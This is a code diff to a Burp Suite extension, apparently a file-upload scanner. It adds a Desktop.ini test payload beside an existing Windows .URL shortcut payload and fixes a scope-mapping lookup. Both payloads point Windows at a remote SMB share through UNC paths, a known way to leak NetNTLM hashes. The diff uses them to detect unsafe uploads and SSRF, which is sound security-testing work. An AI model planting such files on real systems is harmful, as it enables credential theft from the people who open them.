@@ -401,6 +401,13 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             #('', '.URL', 'application/octet-stream'),
         }
 
+        self.INI_TYPES = {
+            #('', BurpExtender.MARKER_ORIG_EXT, ''),
+            #('', BurpExtender.MARKER_ORIG_EXT, 'application/octet-stream'),
+            ('', '.ini', ''),
+            #('', '.URL', 'application/octet-stream'),
+        }
+
         self.ZIP_TYPES = {
             ('', BurpExtender.MARKER_ORIG_EXT, ''),
             ('', BurpExtender.MARKER_ORIG_EXT, 'application/zip'),
@@ -2817,15 +2824,20 @@ trailer <<
         if not burp_colab:
             return colab_tests
 
-        content = '[InternetShortcut]\r\nURL=http://test.example.org/\r\nWorkingDirectory=\\\\test.example.org\SMBShare\r\n' \
-                  'ShowCommand=7\r\nModified=20F06BA06D07BD014D\r\nHotKey=1601'
+        # shortcut.url files for Windows
+        content = '[InternetShortcut]\r\n' \
+                  'URL=http://test.example.org/\r\n' \
+                  'WorkingDirectory=\\\\test.example.org\SMBShare\r\n' \
+                  'ShowCommand=7\r\n' \
+                  'Modified=20F06BA06D07BD014D\r\n' \
+                  'HotKey=1601'
         basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "UrlInternetShortcut"
         title_download = "Malicious URL file upload/download"
         title_colab = "URL file interaction"
         base_detail = 'The payload was a Windows .URL shortcut file, similar to the one here: ' \
                       'https://insert-script.blogspot.ch/2018/05/dll-hijacking-via-url-files.html .'
         detail_download = 'A .URL file was uploaded and downloaded that includes a payload. A user who downloades ' \
-                          'the file and openes it in on Windows might execute the payload and interact with an attacker' \
+                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                           'supplied SMB server. <br><br> {} <br>'.format(base_detail)
         detail_colab = "A Burp Collaborator interaction was detected when uploading an .URL file with a pointer to an external " \
                        "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
@@ -2837,6 +2849,29 @@ trailer <<
         self._send_simple(injector, self.URL_TYPES, basename + "Mal", content, redownload=True)
         colab_tests.extend(self._send_collaborator(injector, burp_colab, self.URL_TYPES, basename + "Colab", content, issue_colab,
                                                    redownload=True, replace="test.example.org"))
+
+        # The same with Desktop.ini
+        content = '[.ShellClassInfo]\r\n' \
+                  'IconResource=\\\\test.example.org\\\r\n'
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "DesktopIni"
+        title_download = "Malicious Desktop.ini file upload/download"
+        title_colab = "URL file interaction"
+        base_detail = 'The payload was a Windows Desktop.ini file, similar to the one here: ' \
+                      'https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ .'
+        detail_download = 'A .ini file was uploaded and downloaded that includes a payload. A user who downloads ' \
+                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
+                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
+        detail_colab = "A Burp Collaborator interaction was detected when uploading an .ini file with a pointer to an external " \
+                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
+                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
+                       "Interactions:<br><br>".format(base_detail)
+        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
+        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
+        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
+        self._send_simple(injector, self.INI_TYPES, "Desktop", content, redownload=True, randomize=False)
+        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.INI_TYPES, "Desktop", content, issue_colab,
+                                                   redownload=True, replace="test.example.org", randomize=False))
+
         return colab_tests
 
     def _csv_spreadsheet(self, injector, burp_colab):
@@ -6848,9 +6883,12 @@ class DownloadMatcherCollection(object):
         g.update(matchers)
         for m in self._global_matchers:
             if not name in m.reported_for:
-                for alt_name in self._scope_mapping[name]:
-                    if alt_name in m.reported_for:
-                        break
+                if name in self._scope_mapping:
+                    for alt_name in self._scope_mapping[name]:
+                        if alt_name in m.reported_for:
+                            break
+                    else:
+                        g.add(m)
                 else:
                     g.add(m)
         return g
